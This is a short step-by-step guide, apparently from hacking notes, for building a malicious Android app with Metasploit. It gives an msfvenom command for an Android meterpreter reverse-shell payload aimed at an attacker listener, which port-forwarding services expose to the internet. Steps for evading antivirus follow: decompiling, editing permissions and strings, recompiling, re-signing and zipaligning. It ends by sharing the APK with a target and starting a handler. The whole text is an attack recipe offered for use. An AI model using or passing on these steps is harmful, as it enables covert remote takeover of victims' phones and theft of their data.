# Create Malicious APK
==============================

#### One Line code to create a malicious apk using Metasploit Framework
* Create a malicious apk using msfvenom:
* msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.20.99 LPORT=1234 R > juice.apk _//Use port forwarding services like portmap.io or ngrok.com to set as LHOST and forward to your VM_

### Share this apk directly or make changes as follows to bypass antivirus detection

1. Decompile the apk - 
	> apktool d malware.apk

2. Open Android.manifest file. Delete unneccesary and suspicious permissions. Modify Android Manifest file with changed permission and recompile, or don't and continue with more changes to make the malicious application more 'undetectable'

3. Add write_external_storage permission if it is not present

4. Go to RES/VALUES folder and edit strings.xml

5. Change the term "MainActivity" and "appname" in <stringname="appname">

6. Compile the malicious application - 
	> apktool b folderpath/

7. Generate a certificate: keytool -genkey -v -keystore my-release-key.Keystore -alias anyname -keyalg RSA -keysize 2048 -validity 10000

8. Resign apk-
	* In windows, place it in java's java/jdk/bin folder, open admin command prompt there and enter commands:
	* Generate keystore by using command - keytool -genkey -v -keystore <anykeystorname.keystore> -alias sh -keyalg RSA -keysize 2048 -validity 10000
	* Enter any password of 6 digits/characters
	* Answer security questions
	* Key will be created in same bin folder
	* Sign the apk by giving command as - jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore <anykeystorename.keystore <disfolderapk.apk> sh

9. jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore juice.apk anyname

10. zipalign -v 4 juice.apk juice1.apk _//share this apk with target_

11. Run msf/exploit/multi/handler to start a reverse TCP handler. Set payload android/meterpreter/reverse_tcp


# Done